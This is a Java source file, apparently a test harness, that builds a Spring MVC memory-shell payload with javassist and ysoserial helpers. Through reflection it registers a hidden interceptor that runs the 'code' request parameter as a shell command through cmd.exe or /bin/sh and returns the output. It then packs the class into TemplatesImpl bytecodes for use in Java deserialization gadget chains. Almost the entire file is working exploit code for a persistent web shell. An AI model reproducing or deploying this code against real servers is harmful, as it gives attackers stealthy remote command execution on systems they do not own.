package tmp;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.xalan.xsltc.runtime.AbstractTranslet;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import ysoserial.payloads.CommonsCollections5WithTempl;
import ysoserial.payloads.util.ClassFiles;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import javax.servlet.http.HttpServletRequest;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class MyTest {
    public static void main(String[] args) throws Exception {
        Templates tpl =  TemplatesImpl.class.newInstance();

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        pool.insertClassPath(new ClassClassPath(AbstractHandlerMapping.class));
        pool.insertClassPath(new ClassClassPath(WebApplicationContext.class));
        pool.importPackage("com.sun.org.apache.xalan.internal.xsltc.runtime");
        pool.importPackage("javax.servlet.http");
        pool.importPackage("javax.servlet");
        pool.importPackage("java.io");
        pool.importPackage("org.springframework.web.context.request");

        CtClass ctClass = pool.get(Gadgets.StubTransletPayload.class.getName());

        CtMethod preHandle = CtNewMethod.make("public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n" +
            "        try {\n" +
            "            PrintWriter writer = response.getWriter();\n" +
            "            String arg0 = request.getParameter(\"code\");\n" +
            "            if (arg0 != null) {\n" +
            "                String o = \"\";\n" +
            "                ProcessBuilder p;\n" +
            "                if (System.getProperty(\"os.name\").toLowerCase().contains(\"win\")) {\n" +
            "                    p = new ProcessBuilder(new String[]{\"cmd.exe\", \"/c\", arg0});\n" +
            "                } else {\n" +
            "                    p = new ProcessBuilder(new String[]{\"/bin/sh\", \"-c\", arg0});\n" +
            "                }\n" +
            "                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(\"\\\\A\");\n" +
            "                o = c.hasNext() ? c.next() : o;\n" +
            "                c.close();\n" +
            "                writer.write(o);\n" +
            "                writer.flush();\n" +
            "                writer.close();\n" +
            "            }\n" +
            "            return false;\n" +
            "        } catch (IOException e) {\n" +
            "            throw new RuntimeException(e);\n" +
            "        }\n" +
            "    }", ctClass);
        ctClass.addMethod(preHandle);


        String static_block = "try {\n" +
            "            org.springframework.web.context.WebApplicationContext context = (org.springframework.web.context.WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0);\n" +
            "            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(\"requestMappingHandlerMapping\");\n" +
            "            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\");\n" +
            "            field.setAccessible(true);\n" +
            "            java.util.ArrayList adaptedInterceptors = (java.util.ArrayList) field.get(abstractHandlerMapping);\n" +
            "            tmp.BadInterceptor_within aaa = new tmp.BadInterceptor_within();\n" +
            "            adaptedInterceptors.add(aaa);\n" +
            "            System.out.println(\"Interceptor has been added\");\n" +
            "        }catch (java.lang.Exception e){}";

        ctClass.makeClassInitializer().insertAfter(static_block);

        ctClass.setName("tmp.BadInterceptor_within");


        CtClass superClass = pool.get(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class.getName());
        ctClass.setSuperclass(superClass);


        byte[] classBytes = ctClass.toBytecode();

        Reflections.setFieldValue(tpl, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(Gadgets.Foo.class)});
        Reflections.setFieldValue(tpl, "_name", "pwnr");
        Reflections.setFieldValue(tpl, "_tfactory", new TransformerFactoryImpl());

        ctClass.writeFile("D:/1tmp/classes");
    }

    public static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        return baos.toByteArray();
    }

    public static Object deserialize(byte[] data) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bais);
        return ois.readObject();
    }
}
